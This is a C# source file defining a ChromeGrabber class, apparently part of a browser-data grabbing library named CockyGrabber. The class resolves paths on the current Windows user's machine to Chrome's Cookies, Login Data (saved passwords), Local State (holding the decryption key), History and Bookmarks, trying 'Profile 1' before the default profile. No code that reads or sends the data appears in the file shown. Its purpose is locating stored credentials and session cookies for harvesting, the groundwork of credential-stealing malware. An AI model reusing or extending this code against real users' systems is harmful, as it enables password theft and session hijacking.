using System;
using System.IO;

namespace CockyGrabber.Grabbers
{
    public class ChromeGrabber : BlinkGrabber
    {
         public override string CookiePath
        {
            get
            {
                if (File.Exists($"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Cookies"))
                    return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Cookies";
                else
                    return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
            }
        }
        public override string LocalStatePath
        {
            get
            {

                return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
            }
        }
        public override string LoginDataPath
        {
            get
            {
                if (File.Exists($"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data"))  
                    return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Login Data";
                else
                    return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
            }
        }
        public override string HistoryPath
        {
            get
            {
                if (File.Exists($"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\History"))
                    return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\History";
                else
                    return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History";
            }
        }
        public override string BookmarkPath
        {
            get
            {
                if (File.Exists($"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Bookmarks"))
                    return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 1\\Bookmarks";
                else
                    return $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks";
            }
        }
    }
}